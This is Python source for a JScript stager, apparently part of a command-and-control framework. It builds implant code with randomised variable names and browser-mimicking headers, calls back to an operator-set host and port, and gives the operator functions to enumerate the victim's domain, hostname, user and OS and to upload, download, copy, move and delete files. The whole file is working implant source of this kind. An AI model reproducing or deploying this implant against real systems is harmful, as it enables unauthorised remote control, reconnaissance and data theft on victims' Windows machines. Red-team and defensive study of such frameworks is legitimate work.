import urllib.parse as parse

from connect import util

class Stager():

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.variables = {}
        self.functions = {}
        self.setup_variables()
        self.setup_functions()

    def setup_variables(self):
        pass

    def setup_functions(self):
        pass

class JScriptStager(Stager):

    format = 'jscript'

    def __init__(self, ip, port):
        super().__init__(ip, port)

    def setup_variables(self):
        self.variables['errors'] = (util.generate_str(), 0)
        self.variables['file-system-object'] = (util.generate_str(), 'new ActiveXObject("Scripting.FileSystemObject")')
        self.variables['host'] = (util.generate_str(), self.ip)
        self.variables['port'] = (util.generate_str(), self.port)
        self.variables['post-req'] = (util.generate_str(), '')
        self.variables['sleep'] = (util.generate_str(), 3000)
        self.variables['useragent'] = (util.generate_str(), 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0')
        self.variables['content-encoding'] = (util.generate_str(), 'gzip, deflate, br')
        self.variables['content-type'] = (util.generate_str(), 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8')
        self.variables['x-frame-options'] = (util.generate_str(), 'SAMEORIGIN')
        self.variables['wscript.shell'] = (util.generate_str(), 'new ActiveXObject("WScript.Shell");')
        self.variables['winhttp.winhttprequest'] = (util.generate_str(), 'new ActiveXObject("WinHttp.WinHttpRequest.5.1");')

        wscript = self.variables['wscript.shell'][0]
        self.variables['domain'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERDOMAIN%");')
        self.variables['hostname'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%COMPUTERNAME%");')
        self.variables['username'] = (util.generate_str(), f'{wscript}.ExpandEnvironmentStrings("%USERNAME%");')
        self.variables['product-name'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName");')
        self.variables['build-number'] = (util.generate_str(), f'{wscript}.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber");')

    def setup_functions(self):
        self.functions['domain'] = util.Function('domain', 'Enumerates the current domain from environment variables', 'function domain(){{return {0}}}'.format(self.variables['domain'][1]), 'Enumeration Options')
        self.functions['hostname'] = util.Function('hostname', 'Enumerates the current hostname from environment variables', 'function hostname(){{return {0}}}'.format(self.variables['hostname'][1]), 'Enumeration Options')
        self.functions['os'] = util.Function('os', 'Enumerates the current operating system product name and build number', 'function os(){{var productname = {0}; var buildnumber = {1}; return productname + " Build " + buildnumber;}}'.format(self.variables['product-name'][1], self.variables['build-number'][1]), 'Enumeration Options')
        self.functions['sleep'] = util.Function('sleep', 'Change the delay between checkins (e.g., sleep 5000) is a delay of 5 seconds', 'function sleep(tmp){{{0} = tmp;}}'.format(self.variables['sleep'][0]), 'Enumeration Options')
        self.functions['dir'] = util.Function('dir','Query directory information (e.g., dir "remote_path")',
        (''' function dir(path){{ '''
          ''' if({0}.FolderExists(path) == false){{ '''
            ''' return 'Folder does not exist.'; '''
           ''' }} '''
          ''' folder = {0}.GetFolder(path); '''
          ''' results = 'Directory is in the ' + folder.drive + ' drive\\n'; '''
          ''' results = results + 'Directory of ' + path + '\\n\\n'; '''
          ''' files = folder.files; '''
          ''' var enumerator = new Enumerator(files); '''
          ''' enumerator.moveFirst(); '''
          ''' while(enumerator.atEnd() == false){{ '''
           ''' var file = enumerator.item(); '''
           ''' try {{ '''
            ''' results = results + file.datecreated + '\\t<' + file.type.toUpperCase() + '>\\t(' + (file.size/1000000).toFixed(3) + ' MB)\\t' + file.name + '\\n'; '''
           ''' }} catch (e) {{ '''
            ''' results = results; '''
           ''' }} '''
           ''' enumerator.moveNext(); '''
          ''' }} '''
          ''' folders = {0}.GetFolder(path).subFolders;  '''
          ''' var enumerator = new Enumerator(folders); '''
          ''' enumerator.moveFirst(); '''
          ''' while(enumerator.atEnd() == false){{ '''
           ''' var sub_folder = enumerator.item(); '''
           ''' try {{ '''
            ''' results = results + sub_folder.datecreated + '\\t<' + sub_folder.type.toUpperCase() + '>\\t(' + (sub_folder.size/1000000).toFixed(3) + ' MB)\\t' + sub_folder.name + '\\n'; '''
           ''' }} catch (e) {{ '''
            ''' results = results; '''
           ''' }} '''
           ''' enumerator.moveNext(); '''
          ''' }} '''
          ''' return results; '''
        ''' }} ''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload file:local_filename, "remote_path")',
        ('''function upload(data, path) {{'''
            '''if ({0}.FileExists(path) == true){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''var stream = new ActiveXObject("ADODB.Stream");'''
            '''stream.Open();'''
            '''stream.Type = 1;'''
            '''stream.Write(data);'''
            '''stream.Position = 0;'''
            '''stream.SaveToFile(path, 2);'''
            '''stream.Close();'''
            '''return 'Successfully uploaded file.';'''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['upload'] = util.Function('upload','Upload a file to the remote system (e.g., upload file:local_filename, "remote_path")',
        ('''function upload(data, path) {{'''
            '''if ({0}.FileExists(path) == true){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''var stream = new ActiveXObject("ADODB.Stream");'''
            '''stream.Open();'''
            '''stream.Type = 1;'''
            '''stream.Write(data);'''
            '''stream.Position = 0;'''
            '''stream.SaveToFile(path, 2);'''
            '''stream.Close();'''
            '''return 'Successfully uploaded file.';'''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['download'] = util.Function('download','Download a file to the remote system (e.g., download "remote_path")',
        ('''function download(path) {{'''
            '''if ({0}.FileExists(path) == false){{'''
                '''return 'File does not exist.';'''
            '''}}'''
            '''var stream = new ActiveXObject("ADODB.Stream");'''
            '''stream.Open();'''
            '''stream.Type = 1;'''
            '''stream.LoadFromFile(path);'''
            '''stream.Position = 0;'''
            '''data = stream.Read();'''
            '''stream.Close();'''
            '''return data'''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['mkdir'] = util.Function('mkdir','Creates a new directory on the remote system (e.g., mkdir "remote_path")',
        ('''function mkdir(path) {{'''
            '''if ({0}.FolderExists(path) == true){{'''
                '''return 'Folder already exists.';'''
            '''}}'''
            '''{0}.CreateFolder(path);'''
            '''return 'Succesfully created directory.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['delfile'] = util.Function('delfile','Delete a file on the remote system (e.g., delfile "remote_path")',
        ('''function delfile(path) {{'''
            '''if ({0}.FileExists(path) == false){{'''
                '''return 'File does not exist.';'''
            '''}}'''
            '''{0}.DeleteFile(path);'''
            '''return 'Succesfully deleted file.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['deldir'] = util.Function('deldir','Delete a directory on the remote system (e.g., deldir "remote_path")',
        ('''function deldir(path) {{'''
            '''if ({0}.FolderExists(path) == false){{'''
                '''return 'Directory does not exist.';'''
            '''}}'''
            '''{0}.DeleteFolder(path);'''
            '''return 'Succesfully deleted directory.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['cpfile'] = util.Function('cpfile','Copy a file on the remote system (e.g., cpfile "remote_source" "remote_destination")',
        ('''function cpfile(source, destination) {{'''
            '''if ({0}.FileExists(source) == false){{'''
                '''return 'File does not exist.';'''
            '''}}'''
            '''if ({0}.FileExists(destination) == true){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''{0}.CopyFile(source, destination);'''
            '''return 'Succesfully copied file.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['cpdir'] = util.Function('cpdir','Copy a directory on the remote system (e.g., cpdir "remote_source" "remote_destination")',
        ('''function cpdir(source, destination) {{'''
            '''if ({0}.FolderExists(source) == false){{'''
                '''return 'Folder does not exist.';'''
            '''}}'''
            '''if ({0}.FolderExists(destination) == true){{'''
                '''return 'Folder already exists.';'''
            '''}}'''
            '''{0}.CopyFolder(source, destination);'''
            '''return 'Succesfully copied directory.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['mvfile'] = util.Function('mvfile','Move a file on the remote system (e.g., mvfile "remote_source" "remote_destination")',
        ('''function mvfile(source, destination) {{'''
            '''if ({0}.FileExists(source) == false){{'''
                '''return 'File does not exist.';'''
            '''}}'''
            '''if ({0}.FileExists(destination) == true){{'''
                '''return 'File already exists.';'''
            '''}}'''
            '''{0}.MoveFile(source, destination);'''
            '''return 'Succesfully moved file.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['mvdir'] = util.Function('mvdir','Move a directory on the remote system (e.g., mvdir "remote_source" "remote_destination")',
        ('''function mvdir(source, destination) {{'''
            '''if ({0}.FolderExists(source) == false){{'''
                '''return 'Folder does not exist.';'''
            '''}}'''
            '''if ({0}.FolderExists(destination) == true){{'''
                '''return 'Folder already exists.';'''
            '''}}'''
            '''{0}.MoveFolder(source, destination);'''
            '''return 'Succesfully moved directory.' '''
        '''}}''').format(self.variables['file-system-object'][0]), 'File System Options')
        self.functions['whoami'] = util.Function('whoami', 'Enumerates the current user from environment variables', 'function whoami(){{return {0}}}'.format(self.variables['username'][1]), 'Enumeration Options')
